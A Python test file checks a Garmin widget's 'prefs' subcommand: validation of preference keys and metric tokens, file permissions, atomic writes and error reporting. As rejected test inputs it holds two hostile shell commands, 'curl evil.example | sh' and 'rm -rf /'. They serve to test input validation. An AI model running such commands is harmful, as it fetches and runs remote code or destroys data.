"""The `prefs` subcommand — the only writer of ~/.config/garmin-widget/prefs.json.

QML never writes files itself: the panel's edit mode calls this, so all disk IO
(atomic replace, 0600, 0700 parent) stays in one place with the same discipline
the token and cache files already get.
"""
import json
import os
import stat

from conftest import load_helper
from test_helper import run


def _prefs_on_disk(mod):
    return json.loads(mod.PREFS_PATH.read_text())


# --- get ---------------------------------------------------------------------

def test_prefs_get_with_no_file_is_empty_and_ok(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "get"], capsys)
    assert rc == 0
    assert out == {"ok": True, "prefs": {}}


def test_prefs_get_corrupt_file_falls_back_to_defaults(home, capsys):
    mod = load_helper()
    mod.PREFS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.PREFS_PATH.write_text("{ this is not json")
    rc, out = run(mod, ["prefs", "get"], capsys)
    assert out == {"ok": True, "prefs": {}}


def test_prefs_get_drops_unknown_keys_and_tokens(home, capsys):
    mod = load_helper()
    mod.PREFS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.PREFS_PATH.write_text(json.dumps({
        "panelMetrics": ["steps", "nonsense", "sleep"],
        "barMetric": "steps",
        "somethingElse": "run: curl evil.example | sh",
    }))
    rc, out = run(mod, ["prefs", "get"], capsys)
    assert out["prefs"] == {"panelMetrics": ["steps", "sleep"],
                            "barMetric": "steps"}


def test_prefs_get_ignores_a_wrong_shaped_file(home, capsys):
    mod = load_helper()
    mod.PREFS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.PREFS_PATH.write_text(json.dumps(["not", "a", "dict"]))
    rc, out = run(mod, ["prefs", "get"], capsys)
    assert out == {"ok": True, "prefs": {}}


def test_prefs_get_drops_an_invalid_bar_metric(home, capsys):
    mod = load_helper()
    mod.PREFS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.PREFS_PATH.write_text(json.dumps({"barMetric": "hrv"}))
    rc, out = run(mod, ["prefs", "get"], capsys)
    assert out == {"ok": True, "prefs": {}}


# --- set ---------------------------------------------------------------------

def test_prefs_set_then_get_roundtrips(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "panelMetrics", "steps, Sleep ,rhr"], capsys)
    assert out["ok"] is True
    assert out["prefs"]["panelMetrics"] == ["steps", "sleep", "rhr"]

    mod2 = load_helper()
    rc, out = run(mod2, ["prefs", "get"], capsys)
    assert out["prefs"]["panelMetrics"] == ["steps", "sleep", "rhr"]


def test_prefs_set_bar_metric_is_canonicalised(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "barMetric", "BODYBATTERY"], capsys)
    assert out["prefs"]["barMetric"] == "bodyBattery"
    assert _prefs_on_disk(mod)["barMetric"] == "bodyBattery"


def test_prefs_set_keeps_the_other_key(home, capsys):
    mod = load_helper()
    run(mod, ["prefs", "set", "barMetric", "steps"], capsys)
    rc, out = run(mod, ["prefs", "set", "panelMetrics", "curve,steps"], capsys)
    assert out["prefs"] == {"barMetric": "steps",
                            "panelMetrics": ["curve", "steps"]}


def test_prefs_set_drops_unknown_tokens_and_duplicates(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "panelMetrics",
                        "steps,steps,bogus,custom"], capsys)
    assert out["prefs"]["panelMetrics"] == ["steps", "custom"]


def test_prefs_set_accepts_the_weight_token(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "panelMetrics", "curve,weight,rhr"], capsys)
    assert out["ok"] is True
    assert out["prefs"]["panelMetrics"] == ["curve", "weight", "rhr"]


def test_prefs_set_rejects_an_invalid_bar_metric(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "barMetric", "hrv"], capsys)
    assert rc == 0
    assert out == {"ok": False, "error": "api-error", "detail": "InvalidPref"}
    assert not mod.PREFS_PATH.exists()


def test_prefs_set_rejects_an_all_unknown_metric_list(home, capsys):
    """An empty result would silently fall back to the shell.json setting,
    which is not what "I turned everything off" should mean."""
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "panelMetrics", "bogus,alsobogus"], capsys)
    assert out == {"ok": False, "error": "api-error", "detail": "InvalidPref"}
    assert not mod.PREFS_PATH.exists()


def test_prefs_set_rejects_an_unknown_key(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "customCommand", "rm -rf /"], capsys)
    assert out == {"ok": False, "error": "api-error", "detail": "InvalidPref"}
    assert not mod.PREFS_PATH.exists()


def test_prefs_set_rejects_an_oversized_value(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "panelMetrics", "steps," * 5000], capsys)
    assert out == {"ok": False, "error": "api-error", "detail": "InvalidPref"}


def test_prefs_set_missing_arguments_is_an_error_not_a_traceback(home, capsys):
    mod = load_helper()
    rc, out = run(mod, ["prefs", "set", "barMetric"], capsys)
    assert rc == 0 and out["ok"] is False and out["detail"] == "InvalidPref"
    rc, out = run(mod, ["prefs"], capsys)
    assert rc == 0 and out["ok"] is False


# --- the file itself ---------------------------------------------------------

def test_prefs_file_is_0600_in_a_0700_directory(home, capsys):
    mod = load_helper()
    run(mod, ["prefs", "set", "barMetric", "sleep"], capsys)
    assert stat.S_IMODE(mod.PREFS_PATH.stat().st_mode) == 0o600
    assert stat.S_IMODE(mod.PREFS_PATH.parent.stat().st_mode) == 0o700


def test_prefs_set_leaves_no_temp_files_behind(home, capsys):
    mod = load_helper()
    run(mod, ["prefs", "set", "barMetric", "sleep"], capsys)
    names = sorted(p.name for p in mod.PREFS_PATH.parent.iterdir())
    assert names == ["prefs.json"]


def test_prefs_set_over_a_corrupt_file_starts_clean(home, capsys):
    mod = load_helper()
    mod.PREFS_PATH.parent.mkdir(parents=True, exist_ok=True)
    mod.PREFS_PATH.write_text("garbage")
    rc, out = run(mod, ["prefs", "set", "barMetric", "steps"], capsys)
    assert out["prefs"] == {"barMetric": "steps"}
    assert _prefs_on_disk(mod) == {"barMetric": "steps"}


def test_prefs_set_reports_a_failed_write(home, capsys, monkeypatch):
    """A pref that did not land must not answer ok — the panel would show a
    setting the next restart quietly forgets."""
    mod = load_helper()
    monkeypatch.setattr(mod, "_atomic_write", lambda *a, **kw: None)
    rc, out = run(mod, ["prefs", "set", "barMetric", "steps"], capsys)
    assert rc == 0
    assert out["ok"] is False and out["error"] == "api-error"


def test_prefs_never_needs_garminconnect(home, capsys, monkeypatch):
    mod = load_helper()
    monkeypatch.setattr(mod, "HAS_GARMINCONNECT", False)
    rc, out = run(mod, ["prefs", "set", "barMetric", "steps"], capsys)
    assert out["ok"] is True
    rc, out = run(mod, ["prefs", "get"], capsys)
    assert out["prefs"]["barMetric"] == "steps"
